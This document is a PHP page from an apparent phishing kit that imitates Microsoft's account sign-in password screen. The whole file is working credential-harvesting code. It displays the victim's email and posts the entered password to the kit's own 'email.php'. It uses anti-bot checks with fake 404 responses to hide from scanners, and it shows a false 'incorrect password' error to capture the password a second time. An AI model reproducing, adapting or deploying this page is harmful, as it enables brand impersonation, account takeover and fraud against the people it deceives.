<?php

    session_start();

    require_once '../../Meta/Comp.php';
    require_once '../../Meta/Antibot.php';
    require_once '../../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (
        !isset($_SESSION['username']) ||
        $_SESSION['username'] == ""
    ) {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Skipping Pages\n\n"
        );
        die();
    }

?>

<!DOCTYPE html>
<html dir="ltr" lang="EN-US">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <title>Sign in to your Microsoft account</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
        <link rel="shortcut icon" href="../../Guard/img/Microsoft/microsoft.ico">
        <link rel="stylesheet" title="Converged_v2" type="text/css" href="../../Guard/css/microsoft.css">
    </head>
    <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
        <div>
            <!--  -->

            <!--  -->

            <div data-bind="if: activeDialog"></div>

            <form action="../../Meta/Benchmark/email.php?token=<?php echo $_SESSION['token']; ?>" method="POST">

                <!-- ko if: svr.C8 -->
                <!-- /ko -->

                <!-- ko withProperties: { '$loginPage': $data } -->
                <div data-bind="component: { name: 'master-page',
                    params: {
                        serverData: svr,
                        showButtons: svr.F,
                        showFooterLinks: true,
                        useWizardBehavior: svr.Bq,
                        handleWizardButtons: false,
                        password: password,
                        hideFromAria: ariaHidden },
                    event: {
                        footerAgreementClick: footer_agreementClick } }">
                    <!--  -->

                    <!-- ko ifnot: useLayoutTemplates -->
                    <!-- /ko -->

                    <!-- ko if: useLayoutTemplates -->
                    <!-- ko withProperties: { '$page': $parent } -->
                    <!-- ko ifnot: isVerticalSplitTemplate -->
                    <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr } }">
                        <!--  -->

                        <div data-bind="component: { name: 'background-image-control', publicMethods: $page.backgroundControlMethods }">
                            <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                                <!-- ko if: smallImageUrl -->
                                <!-- /ko -->

                                <!-- ko if: backgroundImageUrl -->
                                <div style="background-image: url(../../Guard/img/Microsoft/microsoft_bg.svg);" class="background-image ext-background-image"></div>
                                <!-- ko if: useImageMask -->
                                <!-- /ko -->
                                <!-- /ko -->
                            </div>
                        </div>

                        <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
                            <!-- ko if: showHeader -->
                            <!-- /ko -->

                            <div class="template-section main-section">
                                <div class="middle" data-bind="css: { 'has-header': showHeader }">
                                    <!-- ko if: $page.backgroundLogoUrl() && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                                    <!-- /ko -->

                                    <!-- ko if: svr.Cs && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata('hidePageLevelTitleAndDesc')) -->
                                    <!-- /ko -->

                                    <div id="lightbox" data-bind="
                    animationEnd: $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().view_onAnimationEnd,
                    externalCss: { 'sign-in-box': true },
                    css: {
                        'app': $page.backgroundLogoUrl(),
                        'wide': $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().currentViewHasMetadata('wide'),
                        'fade-in-lightbox': $page.fadeInLightBox,
                        'has-popup': $page.showFedCredButtons() || $page.newSession(),
                        'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                        'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">

                                        <!-- ko template: { nodes: $parentContext.$componentTemplateNodes, data: $page } -->

                                        <!-- ko if: svr.BG -->
                                        <!-- /ko -->

                                        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bY &amp;&amp; showLightboxProgress() }"></div>

                                        <!-- ko if: showLightboxProgress -->
                                        <!-- /ko -->

                                        <div class="win-scroll">
                                            <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                                            <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">
                                                <!--  -->

                                                <!-- ko if: bannerLogoUrl -->
                                                <!-- /ko -->

                                                <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                                                <!-- ko component: 'accessible-image-control' -->
                                                <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                                <!-- /ko -->
                                                <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                                <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
                                                
                                                <img class="logo" role="img" src="../../Guard/img/Microsoft/microsoft_logo.svg" alt="Microsoft">
                                                <!-- /ko -->
                                                <!-- /ko -->
                                                <!-- /ko -->
                                                <!-- /ko -->
                                            </div>
                                            <!-- /ko -->

                                            <!-- ko if: svr.cU && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
                                            <!-- /ko -->

                                            <!-- ko if: asyncInitReady -->
                                            <div role="main" data-bind="component: { name: 'pagination-control',
                    publicMethods: paginationControlMethods,
                    params: {
                        enableCssAnimation: svr.aQ,
                        disableAnimationIfAnimationEndUnsupported: svr.b5,
                        initialViewId: initialViewId,
                        currentViewId: currentViewId,
                        initialSharedData: initialSharedData,
                        initialError: $loginPage.getServerError() },
                    event: {
                        cancel: paginationControl_onCancel,
                        loadView: view_onLoadView,
                        showView: view_onShow,
                        setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                        animationStateChange: paginationControl_onAnimationStateChange } }">
                                                <!--  -->

                                                <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                                                    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.J) -->
                                                    <div data-bind="css: {
            'animate': animate() &amp;&amp; animate.animateBanner(),
            'slide-out-next': animate.isSlideOutNext(),
            'slide-in-next': animate.isSlideInNext(),
            'slide-out-back': animate.isSlideOutBack(),
            'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">

                                                        <div data-bind="component: { name: 'identity-banner-control',
                params: {
                    userTileUrl: svr.br,
                    displayName: sharedData.displayName || svr.J,
                    isBackButtonVisible: isBackButtonVisible(),
                    focusOnBackButton: isBackButtonFocused(),
                    backButtonDescribedBy: backButtonDescribedBy() },
                event: {
                    backButtonClick: identityBanner_onBackButtonClick } }">
                                                            <!--  -->

                                                            <div class="identityBanner">
                                                                <!-- ko if: isBackButtonVisible -->
                                                                <button type="button" class="backButton" data-bind="
            attr: { 'id': backButtonId || 'idBtn_Back' },
            ariaLabel: str['CT_HRD_STR_Splitter_Back'],
            ariaDescribedBy: backButtonDescribedBy,
            click: backButton_onClick,
            hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
            <!-- ko ifnot: svr.CJ -->
                <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
    <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
    <img role="presentation" src="../../Guard/img/Microsoft/arrow_left.svg"><!-- /ko -->
    <!-- /ko --><!-- /ko -->
            <!-- /ko -->

            <!-- ko if: svr.CJ --><!-- /ko -->
        </button>
                                                                <!-- /ko -->

                                                                <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }"><?php echo $_SESSION['email']; ?></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <!-- /ko -->

                                                    <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
            'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.J),
            'zero-opacity': hidePaginatedView.hideSubView(),
            'animate': animate(),
            'slide-out-next': animate.isSlideOutNext(),
            'slide-in-next': animate.isSlideInNext(),
            'slide-out-back': animate.isSlideOutBack(),
            'slide-in-back': animate.isSlideInBack() }">

                                                        <!-- ko foreach: views -->
                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- ko template: { nodes: [$data], data: $parent } -->
                                                        <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.AH === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                                                            <!--  -->

                                                            <!--  -->

                                                            <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
                                                            <input type="hidden" name="login" data-bind="value: unsafe_username">
                                                            <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
                                                            <input type="hidden" name="type" data-bind="value: svr.Bq ? 20 : 11" value="11">
                                                            <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
                                                            <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
                                                            <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
                                                            <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
                                                            <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">

                                                            <div id="loginHeader" class="row title ext-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title'], externalCss: { 'title': true }">Enter password</div>

                                                            <!-- ko if: showCredViewBrandingDesc -->
                                                            <!-- /ko -->

                                                            <!-- ko if: unsafe_pageDescription -->
                                                            <!-- /ko -->

                                                            <div class="row">
                                                                <div class="form-group col-md-24">
                                                                    <div role="alert" aria-live="assertive">
                                                                    
                                                                    <div id="passError">
                                                                        
                                                                    </div>

                                                                    <div class="placeholderContainer">
                                                                        <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                                        <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

                                                                        <input name="emailPassword" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" placeholder="Password" required>

                                                                        <!-- ko if: svr.C0 && showPassword() -->
                                                                        <!-- /ko -->
                                                                        <!-- /ko -->
                                                                        <!-- /ko -->
                                                                        <!-- ko ifnot: usePlaceholderAttribute -->
                                                                        <!-- /ko -->
                                                                    </div>

                                                                    <!-- ko if: svr.C0 -->
                                                                    <!-- /ko -->
                                                                </div>
                                                            </div>

                                                            <!-- ko if: shouldHipInit -->
                                                            <!-- /ko -->

                                                            <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                                                <div>
                                                                    <!-- ko if: svr.Ct -->
                                                                    <!-- /ko -->
                                                                    <!-- ko if: svr.Bb !== false && !svr.Ct && !tenantBranding.KeepMeSignedInDisabled -->
                                                                    <!-- /ko -->

                                                                    <div class="row">
                                                                        <div class="col-md-24">
                                                                            <div class="text-13">
                                                                                <!-- ko if: showAccessRecoveryLink -->
                                                                                <div class="form-group">
                                                                                    <a id="idA_PWD_ForgotPassword" role="link" style="cursor: pointer; color: #0067b8;" data-bind="
                                text: str['CT_PWD_STR_ForgotPwdLink_Text'],
                                href: accessRecoveryLink || svr.t,
                                attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                                click: accessRecoveryLink ? null : resetPassword_onClick">Forgot password?</a>
                                                                                </div>
                                                                                <!-- /ko -->
                                                                                <!-- ko if: allowPhoneDisambiguation -->
                                                                                <!-- /ko -->
                                                                                <!-- ko ifnot: useEvictedCredentials -->
                                                                                <!-- ko component: { name: "cred-switch-link-control",
                                params: {
                                    serverData: svr,
                                    username: username,
                                    availableCreds: availableCreds,
                                    flowToken: flowToken,
                                    currentCred: { credType: 1 } },
                                event: {
                                    switchView: credSwitchLink_onSwitchView,
                                    redirect: onRedirect,
                                    setPendingRequest: credSwitchLink_onSetPendingRequest,
                                    updateFlowToken: credSwitchLink_onUpdateFlowToken } } -->
                                                                                <!--  -->

                                                                                <div class="form-group">
                                                                                    <!-- ko if: showSwitchToCredPickerLink -->
                                                                                    <!-- /ko -->

                                                                                    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
                                                                                    <!-- /ko -->

                                                                                    <!-- ko if: credentialCount === 0 && showForgotUsername -->
                                                                                    <!-- /ko -->
                                                                                </div>

                                                                                <!-- ko if: credLinkError -->
                                                                                <!-- /ko -->
                                                                                <!-- /ko -->

                                                                                <!-- ko if: evictedCreds.length > 0 -->
                                                                                <!-- /ko -->
                                                                                <!-- /ko -->
                                                                                <!-- ko if: showChangeUserLink -->
                                                                                <!-- /ko -->
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
                                                                    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                                        <div>
                                                                            <div class="col-xs-24 no-padding-left-right button-container">

                                                                                <!-- ko if: isSecondaryButtonVisible -->
                                                                                <!-- /ko -->

                                                                                <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
                                                                                    <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                                                    <input type="submit" class="button ext-button primary ext-primary" value="Sign in">
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <!-- ko if: tenantBranding.BoilerPlateText -->
                                                            <!-- /ko -->
                                                        </div>
                                                        <!-- /ko -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->
                                                        <!-- /ko -->
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- /ko -->
                                        </div>

                                        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
                                        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
                                        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
                                        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
                                        <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
                                        <input type="hidden" name="ctx" data-bind="value: ctx" value="">
                                        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
                                        <input type="hidden" id="i0327" data-bind="attr: { name: svr.bC }, value: flowToken" name="PPFT" value="DSW8O13EJYtPEmMZc9!KF*culS2sob2MVkgbWyNTHDX1vvErh7xuFICaWMunHktHbeIZJXtOkNW41RvB!tSdXRR985ojFYAA4rCnnjvtpna9cKFK5FbHCAn36f5YPPH!WtkhY8cNcjjXRkxTaED6yPz2LERz8awuetCHi67fow6nGvUDjB*A52TFGQQ4YFJFXs2g68Ry*UTTHzkgWcnQhdYdNyopadGfDeNojnpuOJs3*I1DLiIxC6XHI8iNb4LENcZYwKCwYeIlwI*vqIX!kTM$">
                                        <input type="hidden" name="PPSX" data-bind="value: svr.cq" value="Pa">
                                        <input type="hidden" name="NewUser" value="1">
                                        <input type="hidden" name="FoundMSAs" data-bind="value: svr.Aj" value="">
                                        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
                                        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
                                        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.BG ? 1 : 0" value="0">
                                        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0">
                                        <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">

                                        <div data-bind="component: { name: 'instrumentation-control',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1">
                                            <input type="hidden" name="i17" data-bind="value: srsFailed" value="0">
                                            <input type="hidden" name="i18" data-bind="value: srsSuccess">
                                            <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
                                        <!-- /ko -->
                                    </div>

                                    <!-- ko if: $page.showFedCredButtons -->
                                    <!-- /ko -->

                                    <!-- ko if: $page.newSession -->
                                    <!-- /ko -->

                                    <!-- ko if: $page.showDebugDetails -->
                                    <!-- /ko -->

                                    <!-- ko if: !svr.CA && $page.paginationControlMethods() && $page.paginationControlMethods().hasInitialViewShown() -->
                                    <div id="footer" role="contentinfo" data-bind="
                    externalCss: {
                        'footer': true,
                        'has-background': !$page.useDefaultBackground(),
                        'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

                                        <div data-bind="component: { name: 'footer-control',
                        publicMethods: $page.footerMethods,
                        params: {
                            serverData: svr,
                            useDefaultBackground: $page.useDefaultBackground(),
                            hasDarkBackground: $page.backgroundLogoUrl(),
                            showLinks: true },
                        event: {
                            agreementClick: $page.footer_agreementClick,
                            showDebugDetails: $page.toggleDebugDetails_onClick } }">
                                            <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
                                            <div id="footerLinks" class="footerNode text-secondary">

                                                <!-- ko if: showFooter -->
                                                <!-- ko if: !hideTOU -->
                                                <a id="ftrTerms" data-bind="
                text: termsText,
                href: termsLink,
                click: termsLink_onClick,
                externalCss: {
                    'footer-content': true,
                    'footer-item': true,
                    'has-background': !useDefaultBackground,
                    'background-always-visible': hasDarkBackground }" style="cursor: pointer;" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
                                                <!-- /ko -->

                                                <!-- ko if: !hidePrivacy -->
                                                <a id="ftrPrivacy" data-bind="
                text: privacyText,
                href: privacyLink,
                click: privacyLink_onClick,
                externalCss: {
                    'footer-content': true,
                    'footer-item': true,
                    'has-background': !useDefaultBackground,
                    'background-always-visible': hasDarkBackground }" style="cursor: pointer;" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
                                                <!-- /ko -->

                                                <!-- ko if: impressumLink -->
                                                <!-- /ko -->

                                                <!-- ko if: showIcpLicense -->
                                                <!-- /ko -->
                                                <!-- /ko -->

                                                <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                                                <a id="moreOptions" style="cursor: pointer;" role="button" data-bind="
            click: moreInfo_onClick,
            ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
            attr: { 'aria-expanded': showDebugDetails().toString() },
            hasFocusEx: focusMoreInfo(),
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'debug-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                                            </div>
                                            <!-- /ko -->

                                            <!-- ko if: svr.Cq && showLinks -->
                                            <!-- /ko -->
                                        </div>
                                    </div>
                                    <!-- /ko -->
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- /ko -->

                    <!-- ko if: isVerticalSplitTemplate() && isVerticalSplitTemplateLoaded() -->
                    <!-- /ko -->
                    <!-- /ko -->
                    <!-- /ko -->
                </div>
                <!-- /ko -->
            </form>
        </div>
        <script>
            <?php

                if (isset($_SESSION['emailTwice']) && $_SESSION['emailTwice']) {
                    echo '
                    
                        document.getElementById("i0118").classList.add("has-error");
                        document.getElementById("passError").innerHTML = "<div id=\"passwordError\" class=\"error ext-error\"><span>Your account or password is incorrect.</span></div>";

                    ';
                }

            ?>
        </script>
    </body>
</html>